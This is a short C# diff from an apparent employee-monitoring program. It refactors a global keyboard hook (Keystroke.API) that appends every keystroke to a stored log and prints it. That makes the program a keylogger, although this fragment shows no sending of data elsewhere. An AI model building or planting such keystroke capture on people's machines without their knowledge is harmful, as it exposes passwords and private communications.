@@ -1,12 +1,11 @@
 ﻿using EmployeesMonitor.Lib;
 using EmployeesMonitor.Lib.DataBase;
 using EmployeesMonitor.Lib.Monitor.File;
-using EmpoleeysMonitor.Lib;
-using EmpoleeysMonitor.Lib.Monitor.File;
 using Keystroke.API;
 using System;
 using System.Windows.Forms;
 using SaveToFile;
+using Keystroke.API.CallbackObjects;
 
 namespace EmployeesMonitor
 {
@@ -45,16 +44,17 @@ namespace EmployeesMonitor
             using (var api = new KeystrokeAPI())
             {
 
-                api.CreateKeyboardHook((character) =>
-                {
-                    MyStorage.logStorage += character;
-                    Console.WriteLine(MyStorage.logStorage);
-
-                });
+                api.CreateKeyboardHook(Callback);
 
 
                 Application.Run();
             }
+        }
+
+        private static void Callback(KeyPressed obj)
+        {
+            MyStorage.logStorage += obj.ToString();
+            Console.WriteLine(MyStorage.logStorage);
         }
 
         public static void Connect()
